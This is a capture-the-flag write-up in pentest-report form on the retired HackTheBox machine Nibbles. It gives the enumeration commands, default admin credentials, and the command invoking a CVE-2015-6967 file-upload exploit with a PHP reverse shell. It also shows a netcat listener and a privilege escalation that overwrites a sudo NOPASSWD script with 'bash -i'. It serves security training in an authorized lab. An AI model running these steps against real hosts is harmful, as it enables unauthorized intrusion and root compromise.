# HTB Nibbles - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2025-12-1

**Target:** 10.129.20.119

**Environment:** HTB Nibbles (Retired Machine)

---

## 0. Lesson Learned

Sometimes the answer is easier than you are making it - don't try to catch a privileged reverse shell when you can just upgrade the current shell to root.

---

## 1. Executive Summary

A security assessment was performed against hte target host **10.129.20.119**. During the engagement, multiple weaknesses were identified that allowed full compromise of the system, including user-level access and eventual root privilege escalation. The primary attack vector was a vulnerable instance of **Nibbleblog 4.0.3** susceptible to an **Arbitrary File Upload (CVE-2015-6967)**. Privilege escalation was achieved by abusing a misconfigured **sudo-executable script (monitor.sh)**.

The assessment resulted in full system compromise.

---

## 2. Scope

- **Target:** 10.129.20.119
- **Environment:** HackTheBox (legal/authorized)
- **Testing Window:** 2025-11-28 to 2025-12-1
- **Objective:** Obtain user-level and root-level access

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Vulnerability Analysis
- Exploitation
- Privilege Escalation
- Post-Exploitation

---

## 4. Information Gathering

### 4.1 Nmap Scan

```
nmap -p- -sCV 10.129.20.119 -T4 -oA nibbles_initial
```

#### Results:

- 22/tcp - OpenSSH 7.2p2
- 80/tcp - Apache 2.4.18, default "Hello World" page

---

## 5. Enumeration

### 5.1 Web Enumeration

- Viewing source of the web root exposed directory **/nibbleblog/**.
- Gobuster scan:

```
gobuster dir -u http://10.129.20.119/nibbleblog -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

#### Key Findings:

- `/nibbleblog/admin/`
- Public uploads directory
- Configuration found in `/nibbleblog/content/private/`
- `README` revealed the version: **Nibbleblog v4.0.3 (Coffee)**

### 5.2 Vulnerability Identification

- Searchsploit and GitHub PoC confirmed **CVE-2015-6967 Arbitrary File Upload** applicable to Nibbleblog 4.0.3.

## 6. Exploitation

### 6.1 Authentication

Admin credentials used:

- **Username:** admin
- **Password:** nibbles

### 6.2 Arbitrary File Upload -> Reverse Shell

```
python3 exploit.py --url http://10.129.20.119/nibbleblog/ --username admin --password nibbles --payload shell.php
```

With the CVE-2015-6967 Arbitrary File Upload as `exploit.py` and the default PentestMonkey PHP reverse shell as `shell.php`.

A reverse shell was caught:

```
nc -lnvp 443
```

Result: **Shell as nibbler@Nibbles**

---

## 7. Privilege Escalation

### 7.1 Sudo Enumeration

```
sudo -l
```

#### Finding:

- User *nibbler* can run **monitor.sh** as root with **NOPASSWD**.

### 7.2 Locating the Script

Script was packaged inside `personal.zip`. After extraction:

```
unzip personal.zip
```

The script was found at:

```
/home/nibbler/personal/stuff/monitor.sh
```

### 7.3 Overwriting the Script

Backup made:

```
cp monitor.sh monitor.sh.bak
```

Malicious replacement:

```
echo "bash -i" > monitor.sh
```

### 7.4 Executing as Root

```
sudo /home/nibbler/personal/stuff/monitor.sh
```

Result: **Root shell obtained**

---

## 8. Post-Exploitation

### 8.1 User Flag - *REDACTED*

```
cat /home/nibbler/user.txt
```

### 8.2 Root Flag - *REDACTED*

```
cat /root/root.txt
```

---

## 9. Findings Summary

|Finding|Severity|Description|Impact|
|-------|--------|-----------|------|
| Nibbleblog 4.0.3 Arbitrary File Upload (CVE-2015-6967) | High | Allows authenticated arbitrary PHP upload | Remote code execution as web user |
| Weak admin credentials | High | Default/guessable admin credentials | Enabled exploitation path |
| Misconfigured sudo privilege (monitor.sh) | High | User *nibbler* can execute script as root without password | Full root compromise |

---

## 10. Recommendations

- Update or decommission **Nibbleblog 4.0.3**.
- Remove or secure arbitrary file upload functionality.
- Enforce strong admin passwords.
- Remove insecure sudo NOPASSWD entries.
- Apply least-privilege principles to user scripts.

---

## 11. Appendix

Reference PoC Used:

[CVE-2015-6967 Arbitrary File Upload](https://github.com/dix0nym/CVE-2015-6967)
[PentestMonkey PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)